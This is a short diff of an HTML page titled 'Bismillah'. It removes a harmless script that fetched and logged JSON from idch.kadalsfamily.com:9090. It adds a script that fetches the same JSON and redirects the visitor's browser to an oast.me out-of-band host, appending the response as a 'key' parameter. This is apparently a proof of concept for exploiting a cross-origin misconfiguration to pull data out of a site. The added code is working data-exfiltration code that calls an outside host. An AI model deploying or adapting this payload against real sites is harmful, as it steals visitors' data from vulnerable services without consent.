@@ -7,15 +7,15 @@
 </head>
 <body>
   <h1>Bismillah</h1>
-  <script>
-  fetch('https://idch.kadalsfamily.com:9090/data.json')
-  .then(response => response.json()) // ubah response ke JSON
-  .then(data => {
-    console.log(data); // tampilkan hasil
-  })
-  .catch(error => {
-    console.error('Terjadi error:', error);
-  });
-</script>
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = listener;
+  req.open('get','https://idch.kadalsfamily.com:9090/data.json',true);
+  req.send();
+  function listener() {
+    location='//d432s32dcva356ce4d206bqsgds4ngjb7.oast.me?key='+this.responseText;
+  }
+</script> 
+
 </body>
 </html>
